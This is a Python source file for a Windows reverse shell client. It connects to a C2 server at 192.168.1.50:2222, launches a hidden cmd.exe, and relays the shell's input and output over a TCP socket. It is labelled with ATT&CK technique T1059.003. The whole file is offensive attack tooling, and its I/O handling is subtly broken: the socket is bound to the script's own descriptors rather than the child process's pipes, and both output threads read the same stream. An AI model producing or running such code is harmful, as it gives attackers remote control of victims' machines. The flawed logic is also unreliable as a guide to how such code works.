import subprocess
import socket
import os
import sys
import threading
import select
from typing import Optional


class ShellSession:
    """Manages a single shell session with stdin/stdout/stderr forwarding."""
    
    def __init__(self, host: str = "192.168.1.50", port: int = 2222):
        self.host = host
        self.port = port
        self.socket: Optional[socket.socket] = None
        self.process: Optional[subprocess.Popen] = None
        self.stdin_thread: Optional[threading.Thread] = None
        self.stdout_thread: Optional[threading.Thread] = None
        self.stderr_thread: Optional[threading.Thread] = None
        self.running = False
    
    def connect(self) -> bool:
        """Establish connection to the C2 server."""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.connect((self.host, self.port))
            return True
        except (socket.error, ConnectionRefusedError):
            return False
    
    def spawn_shell(self) -> bool:
        """Spawn cmd.exe with hidden window and new process group."""
        try:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0
            
            self.process = subprocess.Popen(
                ["cmd.exe"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,
                startupinfo=startupinfo,
                close_fds=True,
            )
            return True
        except (subprocess.SubprocessError, FileNotFoundError):
            return False
    
    def _redirect_io(self) -> None:
        """Redirect process I/O through socket using os.dup2."""
        if self.socket is None or self.process is None:
            return
        
        try:
            # Redirect stdin to the socket's file descriptor
            os.dup2(self.socket.fileno(), 0)
            
            # Redirect stdout and stderr to the socket's file descriptor
            os.dup2(self.socket.fileno(), 1)
            os.dup2(self.socket.fileno(), 2)
        except (OSError, ValueError):
            pass
    
    def _read_loop(self, fd: int, thread_name: str) -> None:
        """Non-blocking read loop that forwards data from socket to process."""
        try:
            while self.running and self.socket is not None:
                ready_fds, _, _ = select.select([self.socket], [], [], 0.1)
                if ready_fds:
                    data = self.socket.recv(4096)
                    if data:
                        os.write(fd, data)
        except (OSError, BrokenPipeError):
            pass
    
    def _write_loop(self, fd: int, thread_name: str) -> None:
        """Non-blocking write loop that forwards process output to socket."""
        try:
            while self.running and self.process is not None:
                ready_fds, _, _ = select.select([self.process.stdout], [], [], 0.1)
                if ready_fds:
                    data = self.process.stdout.read(4096)
                    if data:
                        self.socket.sendall(data)
        except (OSError, BrokenPipeError):
            pass
    
    def start(self) -> bool:
        """Start the reverse shell session."""
        if not self.connect():
            return False
        
        if not self.spawn_shell():
            return False
        
        # Redirect I/O through socket
        self._redirect_io()
        
        # Start background threads for non-blocking I/O
        self.stdin_thread = threading.Thread(target=self._read_loop, args=(0,), name="stdin_reader")
        self.stdout_thread = threading.Thread(target=self._write_loop, args=(1,), name="stdout_writer")
        self.stderr_thread = threading.Thread(target=self._write_loop, args=(2,), name="stderr_writer")
        
        self.stdin_thread.daemon = True
        self.stdout_thread.daemon = True
        self.stderr_thread.daemon = True
        
        self.running = True
        self.stdin_thread.start()
        self.stdout_thread.start()
        self.stderr_thread.start()
        
        return True
    
    def stop(self) -> None:
        """Stop the reverse shell session."""
        self.running = False
        if self.process is not None:
            self.process.terminate()
            self.process.wait()
        if self.socket is not None:
            try:
                self.socket.close()
            except (OSError, ValueError):
                pass


class WindowsReverseShellClient:
    """Windows Command Shell reverse shell client.
    
    Spawns an interactive cmd.exe session and forwards all I/O
    to a C2 server via TCP socket using non-blocking read loops.
    
    ATT&CK Technique: T1059.003 (Command and Scripting Interpreter)
    """
    
    def __init__(self, host: str = "192.168.1.50", port: int = 2222):
        self.host = host
        self.port = port
        self.session: Optional[ShellSession] = None
    
    def connect(self) -> bool:
        """Connect to C2 server and spawn shell."""
        self.session = ShellSession(host=self.host, port=self.port)
        return self.session.start()
    
    def disconnect(self) -> None:
        """Disconnect from C2 server and terminate shell."""
        if self.session is not None:
            self.session.stop()
            self.session = None
    
    @property
    def running(self) -> bool:
        """Check if the reverse shell session is active."""
        return self.session is not None and self.session.running


if __name__ == "__main__":
    client = WindowsReverseShellClient(host="192.168.1.50", port=2222)
    
    print("[*] Connecting to C2 server at 192.168.1.50:2222...")
    if client.connect():
        print("[+] Shell session started successfully.")
        print("[!] Interactive shell active. Type 'exit' or press Ctrl+C to disconnect.")
        
        try:
            while True:
                import sys
                line = input()
                if line.strip().lower() == "exit":
                    break
        except (KeyboardInterrupt, EOFError):
            print("\n[*] Disconnecting...")
    else:
        print("[-] Failed to connect to C2 server.")
    
    client.disconnect()
